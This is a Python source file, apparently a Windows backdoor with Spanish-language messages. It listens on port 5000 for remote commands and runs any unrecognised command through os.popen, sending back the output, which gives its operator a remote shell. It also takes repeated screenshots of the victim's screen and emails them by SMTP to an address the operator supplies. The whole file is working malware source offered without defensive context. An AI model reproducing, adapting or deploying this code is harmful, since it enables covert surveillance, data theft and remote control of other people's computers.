#-*-coding: utf-8-*-
from socket import *
from pyautogui import screenshot
from smtplib import SMTP
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from email.mime.text import MIMEText
from threading import *
from os import popen, chdir, getcwd
from time import sleep
from datetime import datetime
from getpass import getuser


class Bd():
	def __init__(self):
		self.brk = True
	def start(self, ip="0.0.0.0", port=5000, lstn=1):
		self.sock = socket()
		self.sock.bind((ip, port))
		self.sock.listen(lstn)
		self.conn, addr = self.sock.accept()
	def fotos(self):
		count = 0
		cc = 0
		self.conn.send("Se ha empezado a tomar fotos.".encode())
		while self.take:
			cc += 1
			try:
				ss = screenshot()
				ss.save("{}\\{}.png".format(self.d,cc))
				msg = MIMEMultipart()
				msg['From']=self.user
				msg['To']=self.urmail
				msg['Subject']="SSBD"
				msg.attach(MIMEText("Screenshot tomada el {}".format(datetime.now())))
				file = open("{}\\{}.png".format(self.d,cc), "rb")
				attach_image = MIMEImage(file.read())
				attach_image.add_header('Content-Disposition', 'attachment; filename = "SCREENSHOT"')
				msg.attach(attach_image)
				server = SMTP(self.server)
				server.starttls()
				server.login(self.user,  self.password)
				server.sendmail(self.user, self.urmail, msg.as_string())
				server.close()
			except Exception as e:
				self.conn.send("{}".format(e).encode())
				count = count +1
				if count >= 5:
					break
			sleep(self.wait)
		self.conn.send("Se ha terminado de mandar fotos.".encode())

	def hear2someone(self):
		self.d ,self.user, self.urmail, self.server, self.password= "C:\\Users\\{}\\Pictures".format(getuser()),str(),str(),str(),str()
		self.wait = 5
		while True:
			cmd = self.conn.recv(1024).decode()
			if cmd[:2] == "cd":
				try:
					chdir(cmd[3:])
				except Exception as cherr:
					self.conn.send("{}".format(e).encode())
				finally:
					self.conn.send("{}".format(getcwd()).encode())
			elif cmd[:4] == "logp":
			    self.password = cmd[5:]
			elif cmd == "show options":
			    self.conn.send("\nUser: {}\nPassword: {}\nSend to: {}\nSMTP server: {}\nTime: {}\nDir: {}".format(self.user,self.password,self.urmail, self.server,self.wait,self.d).encode())
			elif cmd[:6] == "sendto":
				self.urmail = cmd[7:]
			elif cmd[:4] == "logu":
				self.user = cmd[5:]
			elif cmd[:6] == "server":
				self.server = cmd[7:]
			elif cmd[:4] == "take":
				self.take = True
				tks = Thread(target=self.fotos)
				tks.daemon = True
				tks.start()
			elif cmd[:4] == "time":
				try:
					self.wait = int(cmd[5:])
				except Exception as e:
					self.conn.send("No se pudo declarar la variable:\n {}".format(e).encode())
			elif cmd == "stop":
				self.take = False
			elif cmd[:4] == "sdir":
				self.dir = cmd[5:]
			else:
				out = popen(cmd).read()
				self.conn.send("{}".format(out).encode())


if __name__ == '__main__':
	main = Bd()
	while main.brk:
		main.start()
		main.hear2someone()
	